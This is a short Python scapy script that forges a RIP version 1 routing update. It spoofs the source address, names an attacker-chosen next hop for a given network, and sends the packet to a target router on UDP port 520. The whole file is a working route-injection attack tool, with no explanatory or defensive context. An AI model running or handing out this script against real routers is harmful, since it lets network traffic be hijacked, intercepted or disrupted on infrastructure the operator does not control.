import sys
from scapy.all import *

if __name__ == "__main__":
	# Store arguments in variables.
	target_ip = str(sys.argv[1])
	network_addr = str(sys.argv[2])
	reroute_ip = str(sys.argv[3])

	# Create packet for rerouting ip and send it.
	network_ip =network_addr.split("/")
	ip = IP(src=reroute_ip, dst=target_ip)
	rip = RIP(cmd=2, version=1)/ RIPEntry(addr=network_ip[0], mask="255.255.255.0")
	pkt = ip/ UDP(dport=520)/ rip
	send(pkt)

